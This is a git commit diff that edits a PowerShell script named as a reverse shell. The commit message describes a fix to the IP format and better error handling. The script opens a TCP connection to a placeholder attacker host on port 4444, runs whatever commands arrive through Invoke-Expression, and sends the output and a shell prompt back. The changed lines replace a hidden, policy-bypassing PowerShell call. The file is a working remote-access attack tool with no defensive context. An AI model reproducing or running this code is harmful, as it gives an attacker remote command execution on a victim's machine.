ab5bb091b240dddc831c5385115a7d343d7c931a
Waldemar Silva <wpf.silvaa@outlook.com>
2025-10-29 20:01:57 -0300

    Fix IP format and enhance error handling in script
    Updated the client connection IP format and improved error handling for command execution.

--- aux-script-reverse-shell.ps1
+++ aux-script-reverse-shell.ps1
@@ -1,10 +1,14 @@
-$client = New-Object System.Net.Sockets.TCPClient("attacker_ip",4444)
+$client = New-Object System.Net.Sockets.TCPClient("attacker-ip",4444)
 $stream = $client.GetStream()
 [byte[]]$bytes = 0..65535|%{0}
 while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
 {
     $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
-    $sendback = (powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command $data 2>&1 | Out-String )
+    try {
+        $sendback = Invoke-Expression $data 2>&1 | Out-String
+    } catch {
+        $sendback = $_.Exception.Message
+    }
     $sendback2  = $sendback + "PS " + (pwd).Path + "> "
     $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
     $stream.Write($sendbyte,0,$sendbyte.Length)
